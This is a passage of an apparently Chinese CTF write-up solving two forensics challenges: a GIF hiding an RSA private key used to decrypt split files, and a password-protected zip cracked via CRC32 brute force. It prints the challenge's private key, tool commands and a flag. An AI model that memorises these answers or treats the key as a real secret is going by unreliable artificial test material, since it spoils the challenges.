<html>
<head>
  <title>攻防世界高手区14（103-108）</title>
  <basefont face="微软雅黑" size="2" />
  <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
  <meta name="exporter-version" content="YXBJ Windows/605894 (zh-CN, DDL); Windows/6.1.1 (Win64); EDAMVersion=V2;"/>
  <style>
    body, td {
      font-family: 微软雅黑;
      font-size: 10pt;
    }
  </style>
</head>
<body>
<a name="1027"/>
<h1>攻防世界高手区14（103-108）</h1>
<h2><a href="https://DemonStarAlgol.github.io/Misc/">[无关链接]</a></h2>

<div>
<span><div><span style="font-weight: bold;">103 Mysterious-GIF</span></div><div><br/></div><div>下载得到gif文件，十六进制编辑器查看，发现末尾有50 4B 03 04文件头。提取后保存为zip文件。</div><div>解压该zip文件，得到temp.zip。十六进制编辑器查看temp.zip，会发现有多个文件头和文件尾。</div><div><img src="攻防世界高手区14（103-108）_files/Image.png" type="image/png" data-filename="Image.png"/></div><div>用binwalk分离temp.zip，得到了partaa.enc到partke.enc共265个文件。</div><div><br/></div><div>回到gif文件，十六进制编辑器查看其数据块，发现每帧的数据中都包含有一段16进制数字组成的字符串：</div><div><img src="攻防世界高手区14（103-108）_files/Image [1].png" type="image/png" data-filename="Image.png"/></div><div>全部提取得到：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>4d494945767749424144414e42676b71686b6947397730424151454641415343424b6b776767536c41674541416f4942415144644d4e624c3571565769435172</div><div>5832773639712f377933536849507565707478664177525162524f72653330633655772f6f4b3877655a547834346d30414c6f75685634364b63514a6b687271</div><div>67384f79337335593546563177434b3736367532574c775672574d49554a47316a4444725276595049635135557143703545445143696f524d4763555a456732</div><div>75766c3134324c44424161654f4c7a464d3465324a637a532b307238356d5052724353786a4c4b4c614c774949516e5a58497058535552562f776a6877575231</div><div>664a474738512b7563454170615873634e435546343462506d344850434a2f306d7244435457482f59324350564a6b4e6b2b6f305637564f74484b734d4c344e</div><div>434e414a483434572f4952774a6e744e572b4e3848726770526b467567686d4e6a63776c456b7274554b4731735243792f2f57687544756e5632706853525176</div><div>486f74425a76796441674d424141454367674542414a79614e336d6c6b756e772b617137704b5561677636437a6442477964394a78447941706b314b374f4938</div><div>54426873464d2f33744246654131592f41762b7568434c727967726b4279652f6963372f2b30356f3853392b65674d6b52584e484b41757952336752696b7759</div><div>7678454b634a676a5a5a4c524656794159372f6c477634774e42683362495044664631446739737a596e6b774948396c4c454679656d4d3734416941596c6371</div><div>6456645a49452f6271325a344a4f307439484367485a4e6651374a645266656a4e4a51565955443031517535644d744f523465494d6462576b68625658773254</div><div>45304837785178746a7754367a557270714576764f376533464845734249583635565258524c6276394f6f61794a786352715838654a6b5269344c2f597a6f34</div><div>4b5470456d6b64754a4c58734677743361715154626a5a48584f6c5454344e45647348327030547343414543675945412f653162737a4f3061312b6342614451</div><div>6a514f2b50763942734a464442336f314c477555484d4e53384644706e334a3436556b59796b353276496130763454636a715353484e4976585730544445556b</div><div>624e4641314870557856786c7730426965656838426733486658795142685876645444376b306c73446d4d456f3455504b59533644356359577972776864356e</div><div>4344304c72786562674f373552784c35514549452b34435649516b4367594541337638522f584b52564a50453461456567377051347554766346786a454e4e65</div><div>787866364b34787059344c6639636c49766465635268433274314864522b7853756c552f52536152727a4863773378672b4c31754f3073317435533766336e75</div><div>3361696849586b636747537158435a3156487a426d65433430545673664179627337714a30785936543571384d6e78324f62355a336c49477579686a65566174</div><div>4649493253647a324a2f55436759454174654131357a516f6a53504e482b62676d62424e717465763247556a536f374932556b777243316e4559515334636266</div><div>5064444364643066684d6444585534766e2b66575539686b58706d4b7043592b416363626c56554e744e4d4b6649423453484d78716a426961386f31616e5a35</div><div>726b6e6f5638576d4a4f50645a6259666478422f4b4432454434444243464756494c79417975657731506657436f64586969502f5a356a67742b6b4367594541</div><div>727378716f61306f316f3975695237752b48735835494e6f5854394f4f475933715144576a55526e61435779774d756a525979355a774b363930416f6f4c5253</div><div>744e555633334b3453416868384b7153714f6830652b34636b5762354170666c38634b3561362b76383854303958384141645935504247335465622b7673357a</div><div>54704d75626c54434b4a773259617a4754385579564e38666635334e4f3951426f4533686d45796f642f4543675941396b307879434a7a6376654b6478727936</div><div>706a51786b39465a7a3341744570316f635635566f776167562b4f4e657a2f4863634638474a4f384244716c5036586b634c5574736e70367459526545494349</div><div>484b7735432b667741586c4649746d30396145565458772b787a4c4a623253723667415450574d35715661756278667362356d58482f77443969434c684a536f</div><div>724b3052485a6b745062457335797444737142486435504646773d3d</div></div><div>16进制ASCII转码：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQDdMNbL5qVWiCQrX2w69q/7y3ShIPueptxfAwRQbROre30c6Uw/oK8weZTx44m0ALouhV46KcQJkhrqg8Oy3s5Y5FV1wCK766u2WLwVrWMIUJG1jDDrRvYPIcQ5UqCp5EDQCioRMGcUZEg2uvl142LDBAaeOLzFM4e2JczS+0r85mPRrCSxjLKLaLwIIQnZXIpXSURV/wjhwWR1fJGG8Q+ucEApaXscNCUF44bPm4HPCJ/0mrDCTWH/Y2CPVJkNk+o0V7VOtHKsML4NCNAJH44W/IRwJntNW+N8HrgpRkFughmNjcwlEkrtUKG1sRCy//WhuDunV2phSRQvHotBZvydAgMBAAECggEBAJyaN3mlkunw+aq7pKUagv6CzdBGyd9JxDyApk1K7OI8TBhsFM/3tBFeA1Y/Av+uhCLrygrkBye/ic7/+05o8S9+egMkRXNHKAuyR3gRikwYvxEKcJgjZZLRFVyAY7/lGv4wNBh3bIPDfF1Dg9szYnkwIH9lLEFyemM74AiAYlcqdVdZIE/bq2Z4JO0t9HCgHZNfQ7JdRfejNJQVYUD01Qu5dMtOR4eIMdbWkhbVXw2TE0H7xQxtjwT6zUrpqEvvO7e3FHEsBIX65VRXRLbv9OoayJxcRqX8eJkRi4L/Yzo4KTpEmkduJLXsFwt3aqQTbjZHXOlTT4NEdsH2p0TsCAECgYEA/e1bszO0a1+cBaDQjQO+Pv9BsJFDB3o1LGuUHMNS8FDpn3J46UkYyk52vIa0v4TcjqSSHNIvXW0TDEUkbNFA1HpUxVxlw0Bieeh8Bg3HfXyQBhXvdTD7k0lsDmMEo4UPKYS6D5cYWyrwhd5nCD0LrxebgO75RxL5QEIE+4CVIQkCgYEA3v8R/XKRVJPE4aEeg7pQ4uTvcFxjENNexxf6K4xpY4Lf9clIvdecRhC2t1HdR+xSulU/RSaRrzHcw3xg+L1uO0s1t5S7f3nu3aihIXkcgGSqXCZ1VHzBmeC40TVsfAybs7qJ0xY6T5q8Mnx2Ob5Z3lIGuyhjeVatFII2Sdz2J/UCgYEAteA15zQojSPNH+bgmbBNqtev2GUjSo7I2UkwrC1nEYQS4cbfPdDCdd0fhMdDXU4vn+fWU9hkXpmKpCY+AccblVUNtNMKfIB4SHMxqjBia8o1anZ5rknoV8WmJOPdZbYfdxB/KD2ED4DBCFGVILyAyuew1PfWCodXiiP/Z5jgt+kCgYEArsxqoa0o1o9uiR7u+HsX5INoXT9OOGY3qQDWjURnaCWywMujRYy5ZwK690AooLRStNUV33K4SAhh8KqSqOh0e+4ckWb5Apfl8cK5a6+v88T09X8AAdY5PBG3Teb+vs5zTpMublTCKJw2YazGT8UyVN8ff53NO9QBoE3hmEyod/ECgYA9k0xyCJzcveKdxry6pjQxk9FZz3AtEp1ocV5VowagV+ONez/HccF8GJO8BDqlP6XkcLUtsnp6tYReEICIHKw5C+fwAXlFItm09aEVTXw+xzLJb2Sr6gATPWM5qVaubxfsb5mXH/wD9iCLhJSorK0RHZktPbEs5ytDsqBHd5PFFw==</div></div><div>这是一串私钥。</div><div>利用私钥解密前面的265个加密文件：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>openssl rsautl -decrypt -inkey private_key_breakin -in encrypted_file -out decrypted_file</div></div><div>然后用cat命令将解密后的文件合并成一个：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>cat part* &gt; final</div></div><div>可以看到final文件是一张图片：</div><div><img src="攻防世界高手区14（103-108）_files/ans.png" type="image/png" data-filename="ans.png"/></div><div><br/></div><div>flag：FelicityIsFun</div><div><br/></div><div><span style="font-weight: bold;">104 crc</span></div><div><br/></div><div>下载得到zip加密压缩包。</div><div><img src="攻防世界高手区14（103-108）_files/Image [2].png" type="image/png" data-filename="Image.png"/></div><div>利用网上找到的针对6字节文件的脚本对三个txt文件进行crc爆破：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>root@kali:~/Desktop# python crc32.py reverse 0xCC86365B</div><div>4 bytes: {0x65, 0xd7, 0x1e, 0xf0}</div><div>verification checksum: 0xcc86365b (OK)</div><div>alternative: 05J728 (OK)</div><div>alternative: 0EvF7h (OK)</div><div>alternative: 2ysXnu (OK)</div><div>alternative: 3y2iul (OK)</div><div>alternative: R9DrOf (OK)</div><div>alternative: WQkoQX (OK)</div><div>alternative: avuKGt (OK)</div><div>alternative: dO875V (OK)</div><div>alternative: dSwk4B (OK)</div><div>alternative: forum_ (OK)</div><div>alternative: go3DvF (OK)</div><div>alternative: ldpDP2 (OK)</div><div>alternative: r6wKtc (OK)</div><div>alternative: s66zoz (OK)</div><div>alternative: yQGfVS (OK)</div><div><br/></div><div>root@kali:~/Desktop# python crc32.py reverse 0xBCEE7ED5</div><div>4 bytes: {0x1c, 0xeb, 0xe5, 0x41}</div><div>verification checksum: 0xbcee7ed5 (OK)</div><div>alternative: 2VSYDo (OK)</div><div>alternative: 5OTgnD (OK)</div><div>alternative: 7sQy7Y (OK)</div><div>alternative: 91ctf_ (OK)</div><div>alternative: AVfsVk (OK)</div><div>alternative: N5K_u8 (OK)</div><div>alternative: OYyCje (OK)</div><div>alternative: PgLPQi (OK)</div><div>alternative: aYUJmn (OK)</div><div>alternative: c425Xo (OK)</div><div>alternative: cePT4s (OK)</div><div>alternative: d1zWsP (OK)</div><div>alternative: pt05kx (OK)</div><div>alternative: rTzw3q (OK)</div><div><br/></div><div>root@kali:~/Desktop# python crc32.py reverse 0xCCCA7E74</div><div>4 bytes: {0x3f, 0x09, 0x32, 0xe4}</div><div>verification checksum: 0xccca7e74 (OK)</div><div>alternative: 1Atmmb (OK)</div><div>alternative: 6XsSGI (OK)</div><div>alternative: EXFyUM (OK)</div><div>alternative: KWYIiC (OK)</div><div>alternative: Qm0jH5 (OK)</div><div>alternative: Spkdxd (OK)</div><div>alternative: TilZRO (OK)</div><div>alternative: Uub7HB (OK)</div><div>alternative: ZfsjnA (OK)</div><div>alternative: cN3O_z (OK)</div><div>alternative: com_66 (OK)</div><div>alternative: dW4quQ (OK)</div><div>alternative: kXjpRF (OK)</div><div>alternative: lAmNxm (OK)</div><div>alternative: n0EmLx (OK)</div><div>alternative: r24Q5p (OK)</div><div>alternative: rcV0Yl (OK)</div><div>alternative: tf_ciJ (OK)</div></div><div>筛选一下，应该是forum_91ctf_com_66，以此为密码解压convert.txt，内容为：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>001111000110100101101101011001110010000001110011011100100110001100111101001000100110010001100001011101000110000100111010011010010110110101100001011001110110010100101111011100000110111001100111001110110110001001100001011100110110010100110110001101000010110001101001010101100100001001001111010100100111011100110000010010110100011101100111011011110100000101000001010000010100000101001110010100110101010101101000010001010101010101100111010000010100000101000001010100100110011101000001010000010100000101000101010110010100001101000001010010010100000101000001010000010100000101001001001101110100100000110111011000100100000101000001010000010100011001010010001100000110110001000101010100010101011001010010001101000110111001001111001100110110010001010001010110010011010101100010010011100111100001000010010000010101000101010101001010110101000100101011001100010010111101011010010011110101010101000111010010010110011101001000011011000111000101001110001100100110010101110001011101000110111101011001011011000110101001100110010100010110011001110101010001110110100101010001001011110101000001110010001110010010101100101111011000110111011000110100010100000010111100110101001101100011000000111001001011110100000101010000011001110100111101101000010000010101000101000010010010010101010101000110010000010101001101000010010000010101000101000101011001110101001101000101010000100100000101000101011010000101000101010101010000100100100101000101010100000110101000110111001110000100011100111001011001100101100000110001001110010110101001101110011110010100111101011000010001000011010101101111011011100111011000110100001100110100010001101000001101110010111100110111010001110101000001101011010011000100110001101110011011010111011001010011011001010110001101101110011110010110111101101111010001010100000101010011010001100100001001010001010001010110011101010001010001010100001001001001010001010110100001000001010100010100001001001001010101010100011001000001010100110100001001000001010100010100010101100111010100100100111101000001001110010110110101000100010010100110011001110100011100010011100001110111010010000110011000110000001110010101000001001010011101010111100000101111011011000011011101101000010100000110110101000100001110000100010001110010010101000011010101010001010101100100001101010001010010100100001101100111011011110100001101010001010010010100001101000001011010110100001101000001011001110100101001000001011010110100101101000011011001110100101001000001011001110100100101000011010100010100100101011000010000010011010101101011010001000011010101100010010011010100011101010001001011110111010100110101011011110111100101010100001100000011100001101101010001000010111101011001010100000100110000101111010110000111010101010100010100000010111101000101011001000101011101110000010001010110011101001001010000110101000101001001010000110100000101101011010000110101000101101111010010110100000101101011010000110100000101100111010010100100000101100111010010010100001101010001010010100100001101100111011010110100000100101111011010110100100000110001011000010101000001110001011100110011100101010111010001000100101100110100010110000100010001001100011010000110011001011010001100000101011001000011010100010100101001000011011001110110111101000011010100010100100101000011010000010110101101000011010000010110011101001010010000010110101101001011010000110110011101001010010000010110011101001001010000110101000101001001001011110100110101010011010000100011011101001111010100100111100001110101001100110110010001000100001100000111000101100100010100000101010001110110001101100101101001110010010001010110011101010001010001010100001001001001010001010110100001000001010100010100001001001001010101010100011001000001010100110100001001000001010100010100010101100111010100110100010101000010010000010100010101101000010100010110000101000001011001100111100101001000001101110101100001001000010110100110011000110101010010010110001000110010010101000111010100110011010001010101000000111001011101100011100101100101001010110111101000101111011010000100110001111001011100110101001101001010010010010101000101000101010000010101001101000110010000100101000101000101011001110101000101000101010000100100100101000101011010000100000101010001010000100100100101010101010001100100000101010011010000100100001100110100010010000100110101100111001010110111011001100001001100010111100100101111001100100011001001110111011010110011011101010000011000010100101001010100011001100111000101010000011101100011000101000101001011110110001001001001011010010101000101010101010010100100100101000101010000100100000101010011010000100100100101010001010001010100000101010011010001100100001001010001010001010110011101010001010001010100001001001001010001010110100001000001010100110100001001110010011110010110010100110010010010000011001000110110011101110101101001000001010100110011010101100110001110010111101000110101010011010011010100111000011011110100101101111000010010010100010101101000010000010101000101000010010010010101010101000110010000010101001101000010010000010101000101000101011001110101001101000101010000100100000101000101011010000101000101010101010000100100100101000101010000100110011101100100011110010100111101011001011010100111100101001101011010110101100001101110010011100111011101110101011001010111001001000100011010110111011001010001001101100110010101100110011100010100101101110101010101110101101001000101011001110100100101000011010100010100100101000011010000010110101101000011010100010110111101001011010000010110101101000011010000010110011101001010010000010110011101001001010000110101000101001010010000110110011101110011010001000110111101101011011000110101011101010100011001000011011000110011011001010111011001010111010000100111010101111001011001100100100001001001010000100011000001110100011011010110110101101011011101010100011100111001011001000110010101110011010100110100001001000001010100010100010101100111010100110100010101000010010000010100010101101000010100010101010101000010010010010100010101000010010000010101001101000010010010010101000101000101010000010101001101000110010000100011010001001000010010010110011101110101001110000101010001010100010001100011010000101111011001010111101001010111011011110110111000111001011101110111011001101110001110000110011100110011010010010110010101111000001101000100000101001011011110000100100101000101011010000100000101010001010000100100100101010101010001100100000101010011010000100100000101010001010001010110011101010011010001010100001001000001010001010110100001010001010101010100001001001001010001010100010001100111011001000101011101100010011110100110101101010001010011110100000100110111011010110010111101110100011100010110110000110010011101110101100000110011011001010010111101110000011101110011011001001100010100000111001001000101011001110101000101000101010000100100100101000101011010000100000101010001010000100100100101010101010001100100000101010011010000100100000101010001010001010110011101010011010001010100001001000001010001010110100001010001011001010100001100110000010100010011001101011010011110010011000000101011010011000110101101010000010011110011011101110000001110000011010101100001010110000100010001001000001011110011001101001000011110000101101000111001001101010010111101110010001100110111001101101001010010100100001001010001010001010110011101010001010001010100001001001001010001010110100001000001010100010100001001001001010101010100011001000001010100110100001001000001010100010100010101100111010100110100010101000010010010010100100001001100010010010011010001110101010110000011001101001110001100100011010101011010010001100101101000110111001110000101000001010100001110000110010001001101011011010111011000101111010011010101000101101100011101110110110001011001011010110100001101000001011001110100101001000001011010110100101101000011011001110100101001000001011001110100100101000011010100010100100101000011010000010110101101000011010100010110111101001011010000010110101101000011010001000111011101100010011001010010101101010001011011100101001001110111011011010011011101110100001011110011010001100101010101110110011001001010011101000110110101010110010010000100011001110011010011100101000001001001010100110101000101001001010000110100000101101011010000110101000101101111010010110100000101101011010000110100000101100111010010100100000101100111010010010100001101010001010010100100001101100111011100110100010001101100010010000110001001001010010011000110010001101001010110010100111101000100001110010011000000110010001100100100100000101011011110000011011100110011011000110011100101000001001110010110110101010010011110000110011001000010011110000101000101101111010010110100000101101011010000110100000101100111010010100100000101100111010010010100001101010001010010100100001101100111011011110100001101010001010010010100001101000001011010110100001101010000010100100011001101111001010011100011011001011010011101100100101101000110001100010110001101100111010100110011010100110101010001000111010101100011001100110100001001010001001110000100111101010011010110000110011001001101001110000110000100110001010010010110101101000110010000010101001101000010010000010101000101000101011001110101001101000101010000100100000101000101011010000101000101010101010000100100100101000101010000100100000101010011010000100100100101010001010001010110011101100100010011100100000101100100011100110110110001001010011101100100111000111001001100010011011001110000011100100101000001010100001011110101000000110011010101110110111001001010010100100011011101001101010001110110010100110000001101000111100101110100010100110100001001000001010100010100010101100111010100110100010101000010010000010100010101101000010100010101010101000010010010010100010101000010010000010101001101000010010010010101000101000101010000010101001101000110010000100110111101001100001110010100010001001110011100000011100100110010010011000101001001101101001101100011001101100010001100010110011101010000011011100101011000111001001010110111000001010100011011010010111101010011010100000110101000110110011110010110011001001011011010010110011101010001010000100100100101010101010001100100000101010011010000100100000101010001010001010110011101010011010001010100001001000001010001010110100001010001010101010100001001001001010001010100001001000001010100110100001001000011001101110111011001101011010001000011000101011001010011010110101000101011001110010111001100101011010100010110111100110101011011110100110101101100011110000111100101001110010100000101011101101110010010010111010101110011010110010100010101110011011001100100101001111001010100010100100101000011010000010110101101000011010000010110011101001010010000010110101101001011010000110110011101001010010000010110011101001001010000110101000101001001010000110100000101101011010000110010111101010001001101110101101001100111011110010101011101010100011101000101010101101101010101000100110100101011011010010110111001001100001101100101010100111001011001010100111101001100011101100111001101101001010010100100001001010001010001010110011101010001010001010100001001001001010001010110100001000001010100010100001001001001010101010100011001000001010100110100001001000001010100010100010101100111010100110100010101000010010010010100100001010100010100010100100001100010010010100111001001110100010110000011100101101101001100000111100101011000010001000100001100110111001100110110011000110100011101110011011101101011011101110110001101100100010110000011001100111001001101000100101101111000010010010100010101101000010000010101000101000010010010010101010101000110010000010101001101000010010000010101000101000101011001110101001101000101010000100100000101000101011010000101000101010101010000100100100101000101010001000110011101001110010110100100101000101111011001010110110101101010011100010011010101000111001100110110010001111001011101110110101001110100011100000111101001110111001100100111010001000110011110010011100000110100011110100100100101101111010001010100000101010011010001100100001001010001010001010110011101010001010001010100001001001001010001010110100001000001010100010100001001001001010101010100011001000001010100110100001001000001010100010100010101100111010100010111010101101010011110010111100000101011011001010110110101001001001101000111010101011010010011100011000001100011011011000010111101110100001100000011001101110100001101000100101000111001001011110111001001000101001100110010101101111001010001100101000101101011010000110101000101101111010010110100000101101011010000110100000101100111010010100100000101100111010010010100001101010001010010100100001101100111011011110100001101010001010010010100001101000001011010110100001101010000010100100011001101111001010001010011011101100101001010110100100001101100011011100111100101100100011000100101010101001010011000100101000001100001001100110100101000110101011001000111000100101111001011110110110101000101001101110010101101111001010001100101000101101011010000110101000101101111010010110100000101101011010000110100000101100111010010100100000101100111010010010100001101010001010010100100001101100111011011110100001101010001010010010100001101000001011010110100001101010000010100010100010000110010011000010110010001001110010001000110101101101101010110000011011101000100010010010010101101101101010100000111100101010100011011000011010101111000011011010011011101000001001101010101101000101011010010100100111101000101010000100100000101000101011010000101000101010101010000100100100101000101010000100100000101010011010000100100100101010001010001010100000101010011010001100100001001010001010001010110011101010001001010110100100101101011010001000011001001010011010101110101010000110000010010000111011101000101010011110110001001101101010101100110010101001110010010110101001100110111011000100011001101101110011100100011100101100101010010110100001001000001010001010110100001010001010101010100001001001001010001010100001001000001010100110100001001001001010100010100010101000001010100110100011001000010010100010100010101100111010100010100010101000010010010010100010100101011011011110100100001110011011010110110111001001000011011100110111001100011011010110110100000110110011001010100011100111001010010100110011100111001010101100101100001110110010010100110010101000010001011110110101101001111001100100101010100111001011000110100110000110010011101000100011001100111011011110100001101010001010010010100001101000001011010110100001101000001011001110100101001000001011010110100101101000011011001110100101001000001011001110100100101000011010100010100100101000011010000010110101101000011010110000011010100111000010110010101010001101101001100110111011100111001010001110011001001110111011010110010111100111000011100100011100100101111010101000100100100101011010010100110111101010110010000110101000101001010010000110110011101101111010000110101000101001001010000110100000101101011010000110100000101100111010010100100000101101011010010110100001101100111010010100100000101100111010010010100001101010001010010010110111001000001011000010111100101110111010010000011100101101011010100100101100101001011010000010110101101000011010000010110011101001010010000010110011101001001010000110101000101001010010000110110011101101111010000110101000101001001010000110100000101101011010000110100000101100111010010100100000101101011010010110100001101110111010001000011100100110110011011110101000101001111010001010011011000111000001101000100110000110001010100010100000101000001010000010100000101000010010010100101001001010101001101010100010101110010011010110100101001100111011001110110011100111101001111010010001000111110001111000010111101101001011011010110011100111110</div></div><div>二进制转ASCII码得到：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>&lt;img src=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAARgAAAEYCAIAAAAI7H7bAAAFR0lEQVR4nO3dQY5bNxBAQU+Q+1/ZOUGIgHlqN2eqtoYljfQfuGiQ/Pr9+/cv4P/5609/APgOhAQBIUFASBAQEgSEBAEhQUBIEPj78G9fX19jnyOXD5onv43Dh7/7GPkLLnmvSecnyooEASFBQEgQEBIEhAQBIUFASBAQEgROA9mDJftq8wHf09PJux/l7hPmD8DrT5QVCQJCgoCQICAkCAgJAkKCgJAgICQIXA5kD5bMGQ/u5oyT08mD/YPL/XuTP/EdWpEgICQICAkCQoKAkCAgJAgICQJCgkA/kH1aPqs9WDK4XDLhfZ0VCQJCgoCQICAkCAgJAkKCgJAgICQI/MSB7ORxu3dD0qdPTv6ZrEgQEBIEhAQBIUFASBAQEgSEBAEhQaAfyH7XHZf5Ib2Tu3EP9v9e+z/hLysSJIQEASFBQEgQEBIEhAQBIUFASBC4HMg+va1y/22wk7PaJTfqPv1E/bIiQUJIEBASBIQEASFBQEgQEBIEhASBrye2H26wZAS5f9z5M58oKxIEhAQBIUFASBAQEgSEBAEhQUBIEBgdyOYjyMkXnNwuerDkvQ6efqKuWZEgICQICAkCQoKAkCAgJAgICQJCgsDokcWTd63evWBuyfHIB0tmmkuG9desSBAQEgSEBAEhQUBIEBASBIQEASFB4HIgu8TTF4/ezWon9wvn8g3Iex4AKxIEhAQBIUFASBAQEgSEBAEhQUBIEDgdWbzkQOA7k/tql2wX3e/pw6LPrEgQEBIEhAQBIUFASBAQEgSEBAEhQeC0Q3Zy0+LkPO7p85aXDH/3HxZ95/r3siJBQEgQEBIEhAQBIUFASBAQEgSEBIHLI4uX3N25ZFZ78PT8dMmv/MQlwlYkCAgJAkKCgJAgICQICAkCQoKAkCDwbe+QnRwm7t/4eWfJtmVHFsNPISQICAkCQoKAkCAgJAgICQJCgsDlHbJLdiYOD9022H+x73c9A9mRxfBxQoKAkCAgJAgICQJCgoCQICAkCPR3yN6ZvKF1cgS55Duc3BQ8OSXfM8a1IkFASBAQEgSEBAEhQUBIEBASBIQEgdNAdslJvN916prPT/P3WnJR7MGe04ytSBAQEgSEBAEhQUBIEBASBIQEASFBoL9DNp92LRm63b1gPnV9+pTm/SPj6yfKigQBIUFASBAQEgSEBAEhQUBIEBASBC7vkD1YMj+9s+Qo5oMlxyNPWnIusYEsfJyQICAkCAgJAkKCgJAgICQICAkC/Q7ZgyWTtUmTM+inL6U9eOLvsiJBQEgQEBIEhAQBIUFASBAQEgSEBIHTQHbJrtX9m0yXDC73f4w7kwcdX394KxIEhAQBIUFASBAQEgSEBAEhQUBIEDgNZJ/emjq5G3dywjtpzw2tFy84zIoEASFBQEgQEBIEhAQBIUFASBAQEgQujyx+emI4uZN0cl/t03t4J9/rE3+yFQkCQoKAkCAgJAgICQJCgoCQICAkCPR3yE7e+HlnydbUJbPa3J5dq//mE7+yFQkCQoKAkCAgJAgICQJCgoCQICAkCPQD2adNDkmX7DI+mPyTl5xm7A5Z+JOEBAEhQUBIEBASBIQEASFBQEgQ+IkD2SWT0HwEObmVeNKS7b3nr9eKBAEhQUBIEBASBIQEASFBQEgQEBIE+oHsknHnnckh6eG9Jg9VXvJeB/kO2U9cL2tFgoCQICAkCAgJAkKCgJAgICQICAkCX58YTm3w9G2wk/8r9/TI+JoVCQJCgoCQICAkCAgJAkKCgJAgICQInAaywH9kRYKAkCAgJAgICQJCgoCQICAkCAgJAkKCwD96oQOE684L1QAAAABJRU5ErkJggg==&quot;&gt;&lt;/img&gt;</div></div><div>把base64形式图片地址复制到浏览器地址栏访问，得到图像：</div><div><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAARgAAAEYCAIAAAAI7H7bAAAFR0lEQVR4nO3dQY5bNxBAQU+Q+1/ZOUGIgHlqN2eqtoYljfQfuGiQ/Pr9+/cv4P/5609/APgOhAQBIUFASBAQEgSEBAEhQUBIEPj78G9fX19jnyOXD5onv43Dh7/7GPkLLnmvSecnyooEASFBQEgQEBIEhAQBIUFASBAQEgROA9mDJftq8wHf09PJux/l7hPmD8DrT5QVCQJCgoCQICAkCAgJAkKCgJAgICQIXA5kD5bMGQ/u5oyT08mD/YPL/XuTP/EdWpEgICQICAkCQoKAkCAgJAgICQJCgkA/kH1aPqs9WDK4XDLhfZ0VCQJCgoCQICAkCAgJAkKCgJAgICQI/MSB7ORxu3dD0qdPTv6ZrEgQEBIEhAQBIUFASBAQEgSEBAEhQaAfyH7XHZf5Ib2Tu3EP9v9e+z/hLysSJIQEASFBQEgQEBIEhAQBIUFASBC4HMg+va1y/22wk7PaJTfqPv1E/bIiQUJIEBASBIQEASFBQEgQEBIEhASBrye2H26wZAS5f9z5M58oKxIEhAQBIUFASBAQEgSEBAEhQUBIEBgdyOYjyMkXnNwuerDkvQ6efqKuWZEgICQICAkCQoKAkCAgJAgICQJCgsDokcWTd63evWBuyfHIB0tmmkuG9desSBAQEgSEBAEhQUBIEBASBIQEASFB4HIgu8TTF4/ezWon9wvn8g3Iex4AKxIEhAQBIUFASBAQEgSEBAEhQUBIEDgdWbzkQOA7k/tql2wX3e/pw6LPrEgQEBIEhAQBIUFASBAQEgSEBAEhQeC0Q3Zy0+LkPO7p85aXDH/3HxZ95/r3siJBQEgQEBIEhAQBIUFASBAQEgSEBIHLI4uX3N25ZFZ78PT8dMmv/MQlwlYkCAgJAkKCgJAgICQICAkCQoKAkCDwbe+QnRwm7t/4eWfJtmVHFsNPISQICAkCQoKAkCAgJAgICQJCgsDlHbJLdiYOD9022H+x73c9A9mRxfBxQoKAkCAgJAgICQJCgoCQICAkCPR3yN6ZvKF1cgS55Duc3BQ8OSXfM8a1IkFASBAQEgSEBAEhQUBIEBASBIQEgdNAdslJvN916prPT/P3WnJR7MGe04ytSBAQEgSEBAEhQUBIEBASBIQEASFBoL9DNp92LRm63b1gPnV9+pTm/SPj6yfKigQBIUFASBAQEgSEBAEhQUBIEBASBC7vkD1YMj+9s+Qo5oMlxyNPWnIusYEsfJyQICAkCAgJAkKCgJAgICQICAkC/Q7ZgyWTtUmTM+inL6U9eOLvsiJBQEgQEBIEhAQBIUFASBAQEgSEBIHTQHbJrtX9m0yXDC73f4w7kwcdX394KxIEhAQBIUFASBAQEgSEBAEhQUBIEDgNZJ/emjq5G3dywjtpzw2tFy84zIoEASFBQEgQEBIEhAQBIUFASBAQEgQujyx+emI4uZN0cl/t03t4J9/rE3+yFQkCQoKAkCAgJAgICQJCgoCQICAkCPR3yE7e+HlnydbUJbPa3J5dq//mE7+yFQkCQoKAkCAgJAgICQJCgoCQICAkCPQD2adNDkmX7DI+mPyTl5xm7A5Z+JOEBAEhQUBIEBASBIQEASFBQEgQ+IkD2SWT0HwEObmVeNKS7b3nr9eKBAEhQUBIEBASBIQEASFBQEgQEBIE+oHsknHnnckh6eG9Jg9VXvJeB/kO2U9cL2t